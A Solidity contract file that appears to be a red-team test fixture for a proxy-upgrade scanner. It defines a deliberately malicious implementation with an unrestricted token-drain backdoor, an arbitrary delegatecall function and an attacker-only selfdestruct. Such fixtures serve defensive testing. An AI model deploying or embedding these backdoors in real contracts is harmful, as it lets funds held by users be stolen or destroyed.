// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title MaliciousImpl
 * @notice Malicious implementation used in Red-Team scenarios 3 and 6.
 *         Contains backdoors, unauthorized drain mechanisms, and selfdestruct attempts.
 */
contract MaliciousImpl {
    address public attacker;

    event Drained(address indexed token, address indexed to, uint256 amount);
    event AttackerPayloadExecuted();

    constructor(address _attacker) {
        attacker = _attacker;
    }

    /// @notice Backdoor to drain all tokens from calling proxy
    function backdoorDrain(address token) external {
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(attacker, bal);
        emit Drained(token, attacker, bal);
    }

    /// @notice Dangerous function containing delegatecall pattern
    function executeArbitrary(address target, bytes calldata data) external payable {
        // Sentinel scans for DELEGATECALL in bytecode
        (bool ok, ) = target.delegatecall(data);
        require(ok, "delegatecall failed");
        emit AttackerPayloadExecuted();
    }

    /// @notice Dangerous function containing selfdestruct pattern
    function destroy() external {
        require(msg.sender == attacker, "only attacker");
        selfdestruct(payable(attacker));
    }
}
